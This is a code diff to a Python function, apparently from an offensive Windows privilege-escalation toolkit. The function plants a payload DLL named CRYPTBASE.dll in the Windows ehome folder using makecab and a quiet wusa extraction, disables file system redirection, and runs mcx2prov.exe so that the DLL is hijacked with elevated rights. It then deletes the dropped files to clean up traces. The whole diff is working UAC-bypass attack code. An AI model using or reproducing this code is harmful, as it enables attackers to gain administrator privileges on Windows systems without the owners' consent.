@@ -33,9 +33,9 @@ def mcx2prov(payload):
 		time.sleep(5)
 
 		if os.path.isfile(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll")) == True:
-			if process().create("cmd.exe /c makecab {} {}".format(
+			if process().create("makecab.exe", params="{} {}".format(
 					os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"),
-					os.path.join(tempfile.gettempdir(), "suspicious.cab")), 0):
+					os.path.join(tempfile.gettempdir(), "suspicious.cab"))):
 				print_success("Successfully created cabinet file")
 			else:
 				print_success("Unable to create cabinet file")
@@ -47,9 +47,9 @@ def mcx2prov(payload):
 		time.sleep(5)
 
 		if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
-			if process().create("cmd.exe /c wusa {} /extract:{}\ehome /quiet".format(
+			if process().create("wusa.exe", params="{} /extract:{}\\ehome /quiet".format(
 					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
-					information().windows_directory()), 0):
+					information().windows_directory())):
 				print_success("Successfully extracted cabinet file")
 			else:
 				print_error("Unable to extract cabinet file")
@@ -63,24 +63,28 @@ def mcx2prov(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if process().create("cmd.exe /c {}\ehome\mcx2prov.exe".format(information().windows_directory()), 0):
-				print_success("Successfully executed mcx2prov executable")
-				if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
-					try:
-						os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
-					except Exception as error:
-						return False
+			if os.path.exists(os.path.join(information().windows_directory(), 'ehome', 'mcx2prov.exe')):
+				if process().create(os.path.join(information().windows_directory(), 'ehome', 'mcx2prov.exe')):
+					print_success("Successfully executed mcx2prov executable")
+					if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
+						try:
+							os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
+						except Exception as error:
+							return False
+					else:
+						pass
+					if os.path.isfile(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll")) == True:
+						try:
+							os.remove(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"))
+						except Exception as error:
+							return False
+					else:
+						pass
 				else:
-					pass
-				if os.path.isfile(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll")) == True:
-					try:
-						os.remove(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"))
-					except Exception as error:
-						return False
-				else:
-					pass
+					print_error("Unable to execute mcx2prov executable")
+					return False
 			else:
-				print_error("Unable to execute mcx2prov executable")
+				print_error("Cannot found mcx2prov")
 				return False
 	else:
 		print_error("Cannot proceed, invalid payload")
